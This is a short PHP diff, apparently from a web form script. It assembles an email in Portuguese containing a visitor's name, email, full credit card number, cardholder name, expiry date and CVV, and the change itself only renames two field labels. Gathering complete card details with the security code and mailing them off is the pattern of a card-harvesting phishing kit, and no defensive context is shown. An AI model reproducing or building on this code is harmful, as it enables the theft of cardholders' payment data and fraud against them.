@@ -21,8 +21,8 @@
       $mensagem= 'Esta mensagem foi enviada através do formulário<br><br>';
       $mensagem.='<b>Nome: </b>'.$nome.'<br>';
       $mensagem.='<b>Email:</b> '.$email.'<br>';
-      $mensagem.='<b>Numero do cartao:</b> '.$creditcard.'<br>';
-      $mensagem.='<b>Nome do Cartao:</b> '.$nomecartao.'<br>';
+      $mensagem.='<b>Numero_Cartao:</b> '.$creditcard.'<br>';
+      $mensagem.='<b>Nome_Cartao:</b> '.$nomecartao.'<br>';
       $mensagem.='<b>Mes V:</b> '.$ExpiryDate_month.'<br>';
       $mensagem.='<b>Ano V:</b> '.$ExpiryDate_year.'<br>';
       $mensagem.='<b>Cvv:</b> '.$SecurityCode.'<br>';
